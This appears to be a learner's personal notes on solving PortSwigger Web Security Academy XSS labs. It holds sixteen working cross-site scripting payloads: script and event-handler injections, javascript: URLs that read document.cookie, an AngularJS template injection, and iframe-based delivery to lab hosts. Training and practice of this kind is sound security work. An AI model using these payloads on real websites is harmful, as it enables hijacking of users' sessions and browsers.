# xss

==========================================
http://example.com/swagerUI/      SERARCH for swagerui xss payload

==========================================


------------------------------- portswigger laps ----------------------------------

# (1)         

```html
 <h1> 'test' </h1>
       test' </h1>   <script> alert() </script>  <!--
```

-----------------------------------------------------------------------------------
             
# (2)          

### in comments 

```html
<img onload=alert()>
```
-----------------------------------------------------------------------------------

# (3)       

 > ### the 'test >' found it but encoded in html so what is the solution:
   * > i found js code that take query form search and put it in src of img so

     > i put payload in this image


```html
 <img src="query">
             <img src="query" onload=alert()>

             <img src="/resources/images/tracker.gif?searchTerms='+query+'">
                                                                    hello'" onload='alert()'> 
```
            
------------------------------------------------------------------------------------

# (4)         
### the test not in sourse code but there is JS dom code make query in url   

```url
/?search=test
/?search=javascript:confirm()      not work 
/?search=<svg onload=alert()>
```
             
------------------------------------------------------------------------------------

# (5)         
### if i try to submit feedback i notice that in URL 

```url
/feedback?returnPath=/
/feedback?returnPath=javascript:alert(document.cookie)
```
     
------------------------------------------------------------------------------------

# (6) 

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
------------------------------------------------------------------------------------
 
# (7)        
### when write test i found it appear in sourse code in two places 

```html
<h1>0 search results for 'test'</h1>
<input type=text placeholder='Search the blog...' name=search value="test">
```
###  i try

```html
test' <img src=x onerror=alert()>        <!-- not work -->
test' <img src=x onclick=alert()>        <!-- not work -->
```
### i notice that the <> are encoded in source code so i can't use them in ``<input>`` so i try:

```html
test"onmouseover="alert(1)"
```
              
------------------------------------------------------------------------------------

# (8)          
### in website input field 

```html
javascript:alert()
```
             
------------------------------------------------------------------------------------

# (9)         
### in soruse code i found 

```html
<script>
     var searchTerms = 'test';
```

```html
                       'test' alert();     -- not work --
                       'test'; alert();//';  -- solved --
```
             
                                          
------------------------------------------------------------------------------------

# (10)         

```url
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

------------------------------------------------------------------------------------

(11)  DOM XSS in AngularJS expression
 
form portswigger sheet cheat i found

         {{constructor.constructor('alert(1)')()}} 


-------------------------------------------------------------------------------------

# (12)  

```js
\"-alert()}//
```

> ``\``   ==> to close Get / in request

> ``"``   ==> to close the value of json
 
> ``}//`` ==> close json 

------------------------------------------------------------------------------------

# (13)   

```html
<> <img src=x onerror=alert()>
```

-----------------------------------------------------------------------------------

# (14)  

```html
<iframe src="https://0aaf0027041a761d816bed2a006f0054.web-security-academy.net
/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

-----------------------------------------------------------------------------------

# (15) 

```
 <script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```



------------------------------------------------------------------------------------

# (16)

 <svg><animatetransform onbegin=alert(1) attributeName=transform>


-------------------------------------------------------------------------------------

